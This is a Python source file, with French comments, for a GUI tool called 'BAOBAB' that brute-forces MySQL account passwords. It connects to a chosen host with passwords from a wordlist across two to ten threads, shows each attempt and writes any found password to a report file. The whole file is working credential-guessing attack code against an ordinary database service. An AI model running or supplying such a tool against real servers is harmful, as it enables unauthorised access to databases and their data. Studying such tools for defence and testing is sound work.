from tkinter import filedialog, scrolledtext
import customtkinter as ctk
import threading
import mysql.connector
import re
import time # Import de la librairie time pour la gestion du temps
import logging # Import de la librairie logging pour la gestion des erreurs
import queue # Import de la librairie queue pour la gestion des threads 

# Setup du logging pour les erreurs
logging.basicConfig(filename='baobab_errors.log', level=logging.ERROR, format='%(asctime)s %(levelname)s: %(message)s')

# Fonction pour classifier la complexité d'un mot de passe
def classify_password(password):
    complexity_score = 0
    # Vérification de différents critères pour évaluer la complexité.
    if re.search("[a-z]", password):
        complexity_score += 1
    if re.search("[A-Z]", password):
        complexity_score += 1
    if re.search("[0-9]", password):
        complexity_score += 1
    if re.search("[!?@#$%^&*]", password):
        complexity_score += 2
    # La longueur du mot de passe affecte également la complexité.
    complexity_score += len(password) // 8
    return min(complexity_score, 5)

# Écrit un rapport sur le processus de brute-force dans un fichier.
def write_report(duration, password, complexity_level, thread_mode):
    with open("baobab_report.txt", 'a') as file:
        file.write(f"Bruteforce report - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write("--------------------------------------------------\n")
        file.write(f"Thread mode: {thread_mode}\n")
        file.write(f"Bruteforce duration: {duration} seconds\n")
        file.write(f"Found password: {password}\n")
        file.write(f"Password complexity: {complexity_level}/5\n\n")

# Classe principale pour le processus de brute-force.
class BruteForceSQL:
    def __init__(self, host, user, wordlist_path, output_label, output_area, progress_bar, max_threads=10, thread_mode="Chill Mode"):
        # Initialisation des variables importantes pour le processus.
        self.host = host
        self.user = user
        self.wordlist_path = wordlist_path
        self.output_label = output_label
        self.output_area = output_area
        self.progress_bar = progress_bar
        self.password_queue = queue.Queue() # Création d'une file d'attente pour les mots de passe.
        self.max_threads = max_threads # Nombre maximum de threads pour le bruteforce.
        self.stop_thread = False # Variable pour arrêter les threads.
        self.found_password = False # Variable pour arrêter le bruteforce.
        self.thread_mode = thread_mode # Mode de bruteforce (Chill, Normal, Agressive)

    def start(self):
        self.load_passwords() # Charge les mots de passe de la wordlist dans une file d'attente et démarre les threads.
        for _ in range(self.max_threads):
            threading.Thread(target=self.brute_force, daemon=True).start() # Création des threads pour le bruteforce.

    def load_passwords(self):
        # Charge les mots de passe de la wordlist dans la file d'attente.
        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as file: # Ouverture du fichier en mode lecture.
            for password in file: # Parcours de chaque ligne du fichier.
                self.password_queue.put(password.strip()) # Ajout du mot de passe dans la file d'attente.

    def stop(self): # Fonction pour arrêter le bruteforce.
        self.stop_thread = True # Mettre la variable stop_thread à True pour arrêter les threads.
        self.found_password = True # Mettre la variable found_password à True pour arrêter le bruteforce.

    def brute_force(self): # Fonction pour le bruteforce.
        connection = None # Initialisation de la connexion à la base de données.
        start_time = time.time() # Initialisation du temps de début du bruteforce.
        while not self.password_queue.empty() and not self.stop_thread: # Tant que la file d'attente n'est pas vide et que le bruteforce n'est pas arrêté.
            initial_queue_size = self.password_queue.qsize() # Taille initiale de la file d'attente.
            password = self.password_queue.get() # Récupération du mot de passe de la file d'attente.
            self.update_gui(f"Trying password: {password}", progress = 100 * (1 - self.password_queue.qsize() / initial_queue_size)) # Mise à jour de l'interface graphique.
            if self.found_password:
                break
            try:
                connection = mysql.connector.connect(host=self.host, user=self.user, password=password) # Tentative de connexion à la base de données.
                if connection.is_connected():
                    connection.close() # Fermeture de la connexion si la connexion est réussie.
                    end_time = time.time() # Initialisation du temps de fin du bruteforce.
                    complexity_level = classify_password(password) # Classification de la complexité du mot de passe.
                    self.update_gui(f"Found password: {password} | Password complexity: {complexity_level}", 100) # Mise à jour de l'interface graphique.
                    write_report(end_time - start_time, password, complexity_level, self.thread_mode) # Écriture du rapport sur le bruteforce.
                    self.found_password = True
                    while not self.password_queue.empty():
                        self.password_queue.get() # Vidage de la file d'attente.
                    self.stop()
                    break
            except mysql.connector.Error as e:
                logging.error(f"MySQL error: {e}") # Enregistrement de l'erreur dans le fichier de log.
            finally:
                if connection and connection.is_connected(): # Fermeture de la connexion si elle est ouverte.
                    connection.close()

    def update_gui(self, message, progress):
        if self.output_label:
            self.output_label.configure(text=message)
        if self.output_area:
            self.output_area.insert('end', f"{message}\n")
            self.output_area.see('end')
        if self.progress_bar:
            self.progress_bar.set(progress)
    
class BruteForceGUI:
    def __init__(self):
        self.window = ctk.CTk()
        self.window.title("BAOBAB : Best And Overpowered Beating Ass Brute-force")
        self.mode_variation = ctk.StringVar(value="Chill Mode")
        self.setup_widgets()
        self.brute_force_instance = None
    
    def setup_widgets(self):
        #Input de l'hôte
        ctk.CTkLabel(self.window, text="MySQL Host:").pack(pady=10, padx=0)
        self.host_input = ctk.CTkEntry(self.window)
        self.host_input.pack(pady=0, padx=10)
    
        # Input de l'utilisateur
        ctk.CTkLabel(self.window, text="MySQL User:").pack(pady=10, padx=0)
        self.user_input = ctk.CTkEntry(self.window)
        self.user_input.pack(pady=0, padx=10)

        #Input pour la wordlist
        ctk.CTkLabel(self.window, text="Path to wordlist:").pack(pady=10, padx=0)
        wordlist_frame = ctk.CTkFrame(self.window)
        wordlist_frame.pack(pady=0, padx=50)
        self.wordlist_input = ctk.CTkEntry(wordlist_frame)
        self.wordlist_input.pack(side='left', fill='x', expand=True)
        ctk.CTkButton(wordlist_frame, text="Browse", command=self.browse_file).pack(side='right')

        # Zone de texte scrollable pour le logging détaillé
        self.output_area = scrolledtext.ScrolledText(self.window, height=10, padx=10, pady=10)
        self.output_area.pack(pady=50)

        # Barre de progression
        self.progress_bar = ctk.CTkProgressBar(self.window)
        self.progress_bar.pack(pady=10)

        # Label de l'output
        self.output_label = ctk.CTkLabel(self.window, text="Ready")
        self.output_label.pack(pady=10)

        # Bouton pour démarrer / arrêter le bruteforce
        self.start_button = ctk.CTkButton(self.window, text="Start Brute-Force", command=self.start_brute_force)
        self.start_button.pack(pady=10)

        self.stop_button = ctk.CTkButton(self.window, text="Stop Brute-Force", command=self.stop_brute_force)
        self.stop_button.pack(pady=10)

        # Options de mode de bruteforce
        mode_frame = ctk.CTkFrame(self.window)
        mode_frame.pack(pady=10, padx=50)
        ctk.CTkRadioButton(mode_frame, text="Chill Mode", variable=self.mode_variation, value="Chill Mode").pack(side='left', padx=10)
        ctk.CTkRadioButton(mode_frame, text="Normal Mode", variable=self.mode_variation, value="Normal Mode").pack(side='left', padx=10)
        ctk.CTkRadioButton(mode_frame, text="Agressive Mode", variable=self.mode_variation, value="Agressive Mode").pack(side='left', padx=10)

    def browse_file(self):
        self.wordlist_input.delete(0, 'end')
        self.wordlist_input.insert(0, filedialog.askopenfilename())
        
    def start_brute_force(self):
        mode = self.mode_variation.get()
        thread_counts = {"Chill Mode": 2, "Normal Mode": 5, "Agressive Mode": 10}
        max_threads = thread_counts.get(mode, 2)
        self.brute_force_instance = BruteForceSQL(self.host_input.get(), self.user_input.get(), self.wordlist_input.get(), self.output_label, self.output_area, self.progress_bar, max_threads=max_threads, thread_mode=mode)
        self.brute_force_instance.start()

    def stop_brute_force(self):
        if self.brute_force_instance:
            self.brute_force_instance.stop()
        
    def run(self):
        self.window.mainloop()

# Démarrage de l'interface graphique
BruteForceGUI().run()
